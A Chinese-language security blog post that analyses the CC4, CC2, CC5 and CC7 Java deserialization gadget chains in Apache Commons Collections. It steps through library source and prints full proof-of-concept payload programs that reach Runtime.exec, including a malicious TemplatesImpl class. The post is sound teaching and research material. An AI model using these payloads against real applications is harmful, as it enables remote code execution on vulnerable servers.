# 漏洞篇 - Java 反序列化之 CC4+CC2+CC5+CC7 链
> 2024-06-05
> 来源：https://changeyourway.github.io/2024/06/05/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC4+CC2+CC5+CC7%E9%93%BE%E5%88%86%E6%9E%90/

## CC4 链

在 Commons Collections 版本为 3.2.1 的背景下，可以使用 TransformedMap 或者 LazyMap 来执行 transform 方法，但当 Commons Collections 的版本提升到 4.0 时，就又多出了一种办法：利用 TransformingComparator 来执行 transform 方法。

先前我们将 AnnotationInvocationHandler 和 HashMap 作为入口类，利用它们的 readObject 方法来反序列化，但是现在我们还可以利用 PriorityQueue 的 readObject 来反序列化。

**实验环境**

-   java = 8u65
-   CommonsCollections = 4.0

pom.xml 中导入如下依赖：

```
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-collections4</artifactId>
    <version>4.0</version>
</dependency>
```

### 利用链之 TransformingComparator

在 CommonsCollections 4.0 版本中，TransformingComparator 实现了 Serializable 接口，可以被序列化，而在 3.2.1 版本中是不可序列化的。

TransformingComparator 的 compare 方法中就调用了 transform 方法：

```
public int compare(I obj1, I obj2) {
    O value1 = this.transformer.transform(obj1);
    O value2 = this.transformer.transform(obj2);
    return this.decorated.compare(value1, value2);
}
```

transformer 是 TransformingComparator 中定义的属性：

```
private final Transformer<? super I, ? extends O> transformer;
```

这个属性在构造方法中被赋值：

```
public TransformingComparator(Transformer<? super I, ? extends O> transformer, Comparator<O> decorated) {
    this.decorated = decorated;
    this.transformer = transformer;
}
```

另一个构造方法又调用了这个构造方法：

```
public TransformingComparator(Transformer<? super I, ? extends O> transformer) {
    this(transformer, ComparatorUtils.NATURAL_COMPARATOR);
}
```

都是 public ，好说。

### 入口类之 PriorityQueue

###### PriorityQueue#siftDownUsingComparator()

PriorityQueue 类的 siftDownUsingComparator 方法调用了 comparator 的 compare 方法：

```
private void siftDownUsingComparator(int k, E x) {
    int half = size >>> 1;
    while (k < half) {
        int child = (k << 1) + 1;
        Object c = queue[child];
        int right = child + 1;
        if (right < size &&
            comparator.compare((E) c, (E) queue[right]) > 0)
            c = queue[child = right];
        if (comparator.compare(x, (E) c) <= 0)
            break;
        queue[k] = c;
        k = child;
    }
    queue[k] = x;
}
```

comparator 是 PriorityQueue 中定义的成员属性：

```
private final Comparator<? super E> comparator;
```

在构造方法中被赋值：

```
public PriorityQueue(int initialCapacity,
                     Comparator<? super E> comparator) {
    // Note: This restriction of at least one is not actually needed,
    // but continues for 1.5 compatibility
    if (initialCapacity < 1)
        throw new IllegalArgumentException();
    this.queue = new Object[initialCapacity];
    this.comparator = comparator;
}
```

这个构造方法又被另一个构造方法调用：

```
public PriorityQueue(Comparator<? super E> comparator) {
    this(DEFAULT_INITIAL_CAPACITY, comparator);
}
```

只需要将 PriorityQueue 的 comparator 属性赋值成 TransformingComparator 对象即可。

###### PriorityQueue#siftDown()

PriorityQueue 的 siftDown 方法调用了 siftDownUsingComparator 方法：

```
private void siftDown(int k, E x) {
    if (comparator != null)
        siftDownUsingComparator(k, x);
    else
        siftDownComparable(k, x);
}
```

###### PriorityQueue#heapify()

PriorityQueue 的 heapify 方法调用了 siftDown 方法：

```
private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}
```

但是通过代码我们可以发现，进入 for 循环的条件是 `(size >>> 1) - 1 >= 0` ，意思就是将 size 的二进制位无符号右移一位（高位用 0 补全）再减去 1 要大于等于 0 ，故而 size 要大于等于 2 。

size 是 PriorityQueue 中定义的属性，初始值为 0：

```
private int size = 0;
```

想要增加 size 的值，可以通过 PriorityQueue 的 offer 方法：

```
public boolean offer(E e) {
    if (e == null)
        throw new NullPointerException();
    modCount++;
    int i = size;
    if (i >= queue.length)
        grow(i + 1);
    size = i + 1;
    if (i == 0)
        queue[0] = e;
    else
        siftUp(i, e);
    return true;
}
```

从代码中可以看出，offer 方法每被调用一次，size 都会在原来的基础上加 1 。

当然也可以使用 PriorityQueue 的 add 方法，add 方法调用了 offer 方法：

```
public boolean add(E e) {
    return offer(e);
}
```

至于这里为什么不直接用反射修改呢，原因是 size 表示的是这个优先队列中元素的个数：

![](https://changeyourway.github.io/images/image-20240530173750752.png)

如果不往这个优先队列中添加元素，而是直接暴力反射修改 size 的值，那么在序列化时将会报错。

具体可以看 PriorityQueue 的 writeObject 方法：

```
private void writeObject(java.io.ObjectOutputStream s)
    throws java.io.IOException {
    // Write out element count, and any hidden stuff
    s.defaultWriteObject();

    // Write out array length, for compatibility with 1.5 version
    s.writeInt(Math.max(2, size + 1));

    // Write out all elements in the "proper order".
    for (int i = 0; i < size; i++)
        s.writeObject(queue[i]);
}
```

###### PriorityQueue#readObject()

PriorityQueue 的 readObject 方法调用了 heapify 方法：

```
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in size, and any hidden stuff
    s.defaultReadObject();

    // Read in (and discard) array length
    s.readInt();

    queue = new Object[size];

    // Read in all elements.
    for (int i = 0; i < size; i++)
        queue[i] = s.readObject();

    // Elements are guaranteed to be in "proper order", but the
    // spec has never explained what that might be.
    heapify();
}
```

### 调用栈总结

```
PriorityQueue#readObject()
PriorityQueue#heapify()
PriorityQueue#siftDown()
PriorityQueue#siftDownUsingComparator()
TransformingComparator#compare()
ChainedTransformer#transform()
	-> ConstantTransformer#transform()
	-> InstantiateTransformer#transform()
       TrAXFilter#TrAXFilter()
	   TemplatesImpl#newTransformer()
	   TemplatesImpl#getTransletInstance()
		   -> TemplatesImpl#defineTransletClasses()
        	  TransletClassLoader#defineClass() # 类加载的前四个阶段
		   -> Class#newInstance() # 初始化时执行静态代码块
```

### payload

Eval 类：

```
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;
import java.io.Serializable;

public class Eval extends AbstractTranslet {
    // 恶意代码放在静态代码块中
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    // 需要重写父类的两个方法
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

执行程序：

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC4 {

    public static void main(String[] args) {
        try{
            // 初始化 TemplatesImpl 对象
            TemplatesImpl templates = new TemplatesImpl();
            // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件
            byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC2457test\\target\\classes\\com\\miaoji\\Eval.class"));
            setFieldValue(templates, "_bytecodes", new byte[][]{code});
            // _name 不为空
            setFieldValue(templates, "_name", "test");

            // 利用 ChainedTransformer 执行 templates.newTransformer()
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

            // 利用 TransformingComparator 执行 transform 方法
            TransformingComparator comparator = new TransformingComparator(chainedTransformer);

            // 初始化入口类 PriorityQueue
            PriorityQueue priorityQueue = new PriorityQueue(2);
            // 向 priorityQueue 中添加元素，使得元素个数 size 增加
            priorityQueue.add(1);
            priorityQueue.add(1);

            // 在 add 调用完之后，再反射修改 comparator 属性为 TransformingComparator 对象
            Object[] objects = new Object[]{templates, null};
            setFieldValue(priorityQueue, "comparator", comparator);

            // 序列化成字节数组
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(priorityQueue);
            oos.flush();
            oos.close();

            // 反序列化字节数组
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
            ois.close();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    //反射设置 Field
    public static void setFieldValue(Object object, String fieldName, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

这里需要再说明一下，为什么不在构造方法中将 PriorityQueue 的 comparator 属性为 TransformingComparator 对象呢？因为 add 方法会提前调用 comparator.compare() ，造成序列化时命令执行，具体调用如下：

```
PriorityQueue#add() 

-> PriorityQueue#offer() 

-> PriorityQueue#siftUp() 

-> PriorityQueue#siftUpUsingComparator() 

-> PriorityQueue.comparator#compare()
```

所以 payload 是在 add 方法调用完后再将 comparator 属性赋值。

## CC2 链

CC2 链与 CC4 链的相同之处在于它们都将 PriorityQueue 作为入口类，利用 TransformingComparator#compare() 来调用 transform 方法。不同之处在于 CC2 链用 InvokerTransformer 代替 TrAXFilter + InstantiateTransformer 来执行 TemplatesImpl#newTransformer()

### 调用栈总结

```
PriorityQueue#readObject()
PriorityQueue#heapify()
PriorityQueue#siftDown()
PriorityQueue#siftDownUsingComparator()
TransformingComparator#compare()
ChainedTransformer#transform()
	-> ConstantTransformer#transform()
    -> InvokerTransformer#transform()
	   TemplatesImpl#newTransformer()
	   TemplatesImpl#getTransletInstance()
		   -> TemplatesImpl#defineTransletClasses()
        	  TransletClassLoader#defineClass() # 类加载的前四个阶段
		   -> Class#newInstance() # 初始化时执行静态代码块
```

### payload

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC2 {
    public static void main(String[] args) {
        try{
            // 初始化 TemplatesImpl 对象
            TemplatesImpl templates = new TemplatesImpl();
            // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件
            byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC2457test\\target\\classes\\com\\miaoji\\Eval.class"));
            setFieldValue(templates, "_bytecodes", new byte[][]{code});
            // _name 不为空
            setFieldValue(templates, "_name", "test");

            // 利用 ChainedTransformer 执行 templates.newTransformer()
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(templates),
                    new InvokerTransformer("newTransformer", null,null)
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

            // 利用 TransformingComparator 执行 transform 方法
            TransformingComparator comparator = new TransformingComparator(chainedTransformer);

            // 初始化入口类 PriorityQueue
            PriorityQueue priorityQueue = new PriorityQueue(2);
            // 向 priorityQueue 中添加元素，使得元素个数 size 增加
            priorityQueue.add(1);
            priorityQueue.add(1);

            // 在 add 调用完之后，再反射修改 comparator 属性为 TransformingComparator 对象
            Object[] objects = new Object[]{templates, null};
            setFieldValue(priorityQueue, "comparator", comparator);

            // 序列化成字节数组
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(priorityQueue);
            oos.flush();
            oos.close();

            // 反序列化字节数组
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
            ois.close();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    //反射设置 Field
    public static void setFieldValue(Object object, String fieldName, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

## CC5 链

CC5 链将 BadAttributeValueExpException#readObject() 作为入口，利用 TiedMapEntry#tostring() 来调用 LazyMap#get() ，进而调用 transform 方法。

**实验环境**

-   java = 8u65
-   CommonsCollections = 3.2.1

pom.xml 中导入如下依赖：

```
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

### 利用链之 TiedMapEntry

前面在使用 TiedMapEntry 时，用的是它的 getValue 方法来调用其成员属性 map 的 get 方法：

```
public Object getValue() {
    return map.get(key);
}
```

TiedMapEntry 的 toString 方法又调用了 getValue 方法：

```
public String toString() {
    return getKey() + "=" + getValue();
}
```

### 入口类之 BadAttributeValueExpException

BadAttributeValueExpException 的 readObject 方法调用了 valObj 的 toString 方法：

```
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ObjectInputStream.GetField gf = ois.readFields();
    Object valObj = gf.get("val", null);

    if (valObj == null) {
        val = null;
    } else if (valObj instanceof String) {
        val= valObj;
    } else if (System.getSecurityManager() == null
            || valObj instanceof Long
            || valObj instanceof Integer
            || valObj instanceof Float
            || valObj instanceof Double
            || valObj instanceof Byte
            || valObj instanceof Short
            || valObj instanceof Boolean) {
        val = valObj.toString();
    } else { // the serialized object is from a version without JDK-8019292 fix
        val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
    }
}
```

我们看看 valObj 是怎么来的：

`ObjectInputStream.GetField gf = ois.readFields();`

-   ois：一个 ObjectInputStream 实例，用于从输入流中读取对象。
-   readFields()：读取对象的字段，并返回一个 ObjectInputStream.GetField 对象，这个对象包含了序列化对象的字段和值。

`Object valObj = gf.get("val", null);`

-   gf：前面获取的 ObjectInputStream.GetField 对象。
-   get(“val”, null)：从 gf 中获取名为 val 的字段值。如果 val 字段不存在，则返回 null。

所以说，valObj 的值就是 val 的值，而 val 是 BadAttributeValueExpException 中定义的属性：

```
private Object val;
```

所以我们只需要将 val 赋值成 TiedMapEntry 对象即可。

但是我们并不能用构造方法赋值，因为构造方法会提前调用 val 的 toString 方法，造成命令执行：

```
public BadAttributeValueExpException (Object val) {
    this.val = val == null ? null : val.toString();
}
```

所以这里选择反射修改 val 的值。

再来看判断，调用 valObj.toString() 的前提是：

```
System.getSecurityManager() == null
            || valObj instanceof Long
            || valObj instanceof Integer
            || valObj instanceof Float
            || valObj instanceof Double
            || valObj instanceof Byte
            || valObj instanceof Short
            || valObj instanceof Boolean
```

这个式子返回 true 。若 valObj 为 TiedMapEntry 对象，则所有的 instanceof 判断均为 false 。System.getSecurityManager() 作用是获取当前 Java 虚拟机 (JVM) 安装的 SecurityManager（ Java 中的一种安全机制，用于在运行时对代码进行安全检查），默认情况下是没有安装的，所以返回 null ，那么上述判断默认情况下为 true 。

当然也就可以知道：理论上，如果受害者安装了 SecurityManager ，CC5 链就行不通。

### 调用栈总结

```
BadAttributeValueExpException#readObject()
TiedMapEntry#toString()
TiedMapEntry#getValue()
LazyMap#get()
ChainedTransformer#transform()
	-> ConstantTransformer#transform()
	-> InvokerTransformer#transform()
	   Runtime#exec()
```

### payload

CC5 链还是采用 InvokerTransformer 命令执行的办法。

```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC5 {
    public static void main(String[] args) throws Exception {

        // 利用 ChainedTransformer 执行 Runtime.getRuntime.exec("calc")
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        // 利用 LazyMap 的 get 方法执行 ChainedTransformer 的 transform 方法
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        // 利用 TiedMapEntry 的 toString 方法执行 LazyMap 的 get 方法
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");

        // 利用 BadAttributeValueExpException 的 readObject 方法执行 TiedMapEntry 的 toString 方法
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        // 反射设置 val ，不在构造方法中设置 val 是为了避免提前代码执行
        Field val = BadAttributeValueExpException.class.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, tiedMapEntry);

        // 序列化成字节数组
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(badAttributeValueExpException);
        oos.flush();
        oos.close();

        // 反序列化字节数组
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();

    }
}
```

## CC7 链

CC7 链将 Hashtable#readObject() 作为入口，利用 AbstractMap#equals() 来调用 LazyMap#get() ，进而调用 transform 方法。

### 利用链之 AbstractMap

AbstractMap 的 equals 方法调用了 m 的 get 方法：

```
public boolean equals(Object o) {
    if (o == this)
        return true;

    if (!(o instanceof Map))
        return false;
    Map<?,?> m = (Map<?,?>) o;
    if (m.size() != size())
        return false;

    try {
        Iterator<Entry<K,V>> i = entrySet().iterator();
        while (i.hasNext()) {
            Entry<K,V> e = i.next();
            K key = e.getKey();
            V value = e.getValue();
            if (value == null) {
                if (!(m.get(key)==null && m.containsKey(key)))
                    return false;
            } else {
                if (!value.equals(m.get(key)))
                    return false;
            }
        }
    } catch (ClassCastException unused) {
        return false;
    } catch (NullPointerException unused) {
        return false;
    }

    return true;
}
```

来看 m 在 equals 方法中的定义：

```
Map<?,?> m = (Map<?,?>) o;
```

所以只要将传入的 o 设置成 LazyMap 对象就好了。

### 利用链之 AbstractMapDecorator

AbstractMapDecorator 的 equals 方法会调用 map 的 equals 方法：

```
public boolean equals(Object object) {
    if (object == this) {
        return true;
    }
    return map.equals(object);
}
```

map 是 AbstractMapDecorator 中定义的成员属性：

```
protected transient Map map;
```

在构造方法中被赋值：

```
public AbstractMapDecorator(Map map) {
    if (map == null) {
        throw new IllegalArgumentException("Map must not be null");
    }
    this.map = map;
}
```

可以将 map 赋值成 AbstractMap 对象。

### 入口类之 Hashtable

Hashtable 的 reconstitutionPut 方法调用了 e.key.equals() ：

```
private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
    throws StreamCorruptedException
{
    if (value == null) {
        throw new java.io.StreamCorruptedException();
    }
    // Makes sure the key is not already in the hashtable.
    // This should not happen in deserialized version.
    int hash = key.hashCode();
    int index = (hash & 0x7FFFFFFF) % tab.length;
    for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
        if ((e.hash == hash) && e.key.equals(key)) {
            throw new java.io.StreamCorruptedException();
        }
    }
    // Creates the new entry.
    @SuppressWarnings("unchecked")
    Entry<K,V> e = (Entry<K,V>)tab[index];
    tab[index] = new Entry<>(hash, key, value, e);
    count++;
}
```

这里需要注意几个点：

一是 value 需要不为空，否则抛出异常；

二是 for 循环中的 if 判断条件 (e.hash == hash) && e.key.equals(key) ，使用 && 符号，具有短路特性，也就是说只有左边的式子返回 true ，右边的式子才会执行。

Hashtable 的 value 属性可以通过 put 方法赋值；

要调用到 e.key.equals() 我们需要保证 e.key 是一个 AbstractMapDecorator 对象，但是 AbstractMapDecorator 是一个抽象类，并不能直接 new 对象，已知 LazyMap 继承了 AbstractMapDecorator 这个抽象类，所以可以考虑将 e.key 赋值为 LazyMap 对象；

e 是传入的参数 Entry\[\] tab 数组的某一个键值对，想知道这个 tab 是什么，还得往后看。

Hashtable 的 readObject 方法调用了 reconstitutionPut 方法：

```
private void readObject(java.io.ObjectInputStream s)
     throws IOException, ClassNotFoundException
{
    // Read in the length, threshold, and loadfactor
    s.defaultReadObject();

    // Read the original length of the array and number of elements
    int origlength = s.readInt();
    int elements = s.readInt();

    // Compute new size with a bit of room 5% to grow but
    // no larger than the original size.  Make the length
    // odd if it's large enough, this helps distribute the entries.
    // Guard against the length ending up zero, that's not valid.
    int length = (int)(elements * loadFactor) + (elements / 20) + 3;
    if (length > elements && (length & 1) == 0)
        length--;
    if (origlength > 0 && length > origlength)
        length = origlength;
    table = new Entry<?,?>[length];
    threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
    count = 0;

    // Read the number of elements and then all the key/value objects
    for (; elements > 0; elements--) {
        @SuppressWarnings("unchecked")
            K key = (K)s.readObject();
        @SuppressWarnings("unchecked")
            V value = (V)s.readObject();
        // synch could be eliminated for performance
        reconstitutionPut(table, key, value);
    }
}
```

可以看到传入 reconstitutionPut 方法的第一个参数是 table ，table 是 Hashtable 中定义的一个属性：

```
private transient Entry<?,?>[] table;
```

这个属性被 transient 修饰，不能参加序列化，也就是说反序列化通过 Hashtable 的 readObject 方法第一次调用 reconstitutionPut 方法时，table 至少是没有值的。

再放一遍 reconstitutionPut 代码：

![](https://changeyourway.github.io/images/image-20240603145606511.png)

回到前面的问题，第一次调用 reconstitutionPut 方法时 table 为空，故而 for 循环中取到的 e 为空，直接跳出 for 循环，进行后面的赋值：

```
Entry<K,V> e = (Entry<K,V>)tab[index];
tab[index] = new Entry<>(hash, key, value, e);
```

这里调用了 Entry 的构造方法，会将其成员属性 hash 赋值为前面调用 key.hashCode() 算出来的 hash 值。

Entry 是 Hashtable 中的一个静态内部类，其构造方法如下：

![](https://changeyourway.github.io/images/image-20240603144348816.png)

第一次 reconstitutionPut 方法被调用完后，会回到 readObject 方法的循环中，Hashtable 中的键值对有多少个，这个 for 循环就执行多少次，reconstitutionPut 方法就被调用多少次，那么如果在 Hashtable 中放入两个 LazyMap 对象：

```
hashtable.put(lazyMap1, "test");
hashtable.put(lazyMap2, "test");
```

reconstitutionPut 方法自然会执行两次，第二次调用时，tab\[index\] 就有值了，且只有一个值，就是 lazyMap1 => “test” ，我们又知道，hash 是调用 key.hashCode() 得到的，lazyMap1.hashCode() 会调用其父类 AbstractMapDecorator 的 hashCode() 方法，并最终会调用其成员属性 map 的 hashCode() 方法。

若 map 是 HashMap 对象，则会调用 HashMap 的 hashCode() 方法，这个方法在其静态内部类 Node<K,V> 中：

```
public final int hashCode() {
    return Objects.hashCode(key) ^ Objects.hashCode(value);
}
```

可以看到，HashMap 的 hashCode() 方法是分别计算其 key 的 hash 和 value 的 hash 再按位异或得到的。

接下来需要使判断 `e.hash == hash` 返回 true ，即使 `lazyMap1.hashCode() == lazyMap2.hashCode()` 成立。但是 lazyMap1 与 lazyMap2 又不能完全一样，因为 hashtable.put 在往 hashtable 对象里添加键值对的时候，如果键一样的话，会将值替换掉，如果 lazyMap1 与 lazyMap2 完全一样，那么第二个 put 就只会做替换，这样 hashtable 对象里面就仍然只有一个键值对。

所以这里我们沿用前辈们的思路：

```
lazyMap1.put("yy", 1);
lazyMap2.put("zZ", 1);
```

由于 “yy” 与 “zZ” 算出来的 hash 值一样，所以这样设置好两个 LazyMap 对象中的 map 属性之后，hashCode() 方法得出来的结果是一样的。

最后一点就是，hashtable 的 put 方法会提前调用 equals 方法：

```
public synchronized V put(K key, V value) {
    // Make sure the value is not null
    if (value == null) {
        throw new NullPointerException();
    }

    // Makes sure the key is not already in the hashtable.
    Entry<?,?> tab[] = table;
    int hash = key.hashCode();
    int index = (hash & 0x7FFFFFFF) % tab.length;
    @SuppressWarnings("unchecked")
    Entry<K,V> entry = (Entry<K,V>)tab[index];
    for(; entry != null ; entry = entry.next) {
        if ((entry.hash == hash) && entry.key.equals(key)) {
            V old = entry.value;
            entry.value = value;
            return old;
        }
    }

    addEntry(hash, key, value, index);
    return null;
}
```

仔细观察上述代码，发现跟 reconstitutionPut 方法很像，所以为了防止提前命令执行，先传入一个空的 Transformer 到 LazyMap 即可。

有了上述的结论，就可以开始书写 payload 了。

### payload

```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7 {

    public static void main(String[] args) throws Exception {
        // 利用 ChainedTransformer 执行 Runtime.getRuntime.exec("calc")
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        // 先传入空的 Transformer 数组，防止 put 时命令执行
        Transformer[] transformers1 = new Transformer[]{};
        Transformer chainedTransformer = new ChainedTransformer(transformers1);

        // 新建两个 HashMap 作为传入的参数
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        // 新建两个 LazyMap ，确保 hashCode() 结果一样
        Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer);
        lazyMap1.put("yy", 1);
        Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);
        lazyMap2.put("zZ", 1);

        // 新建入口类 Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, "test1");
        hashtable.put(lazyMap2, "test2");

        // 通过反射设置 transformer 数组
        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);

        //上面的 hashtable.put 会使得 lazyMap2 增加一个 yy=>yy，所以这里要移除
        lazyMap2.remove("yy");

        // 序列化成字节数组
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashtable);
        oos.flush();
        oos.close();

        // 反序列化字节数组
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

}
```

### 调用栈总结

梳理调用栈之前，先知道两件事：

-   LazyMap 继承了 AbstractMapDecorator
-   HashMap 继承了 AbstractMap

```
Hashtable#readObject()
	-> Hashtable#reconstitutionPut()
	-> Hashtable#reconstitutionPut()
	   AbstractMapDecorator#equals()
	   AbstractMap#equals()
	   LazyMap#get()
	   ChainedTransformer#transform()
	   InvokerTransformer#transform()
       Runtime#exec()
```

## 参考文章

[CC链 1-7 分析](https://xz.aliyun.com/t/9409?time__1311=n4+xuDgD9AYCqAKGQ3DsD7feyK4AxxnAxbD&alichlgref=https://www.google.com/)

[https://www.yuque.com/5tooc3a/jas/gggdt0vwi5n0zwhr#CUjq4](https://www.yuque.com/5tooc3a/jas/gggdt0vwi5n0zwhr#CUjq4)
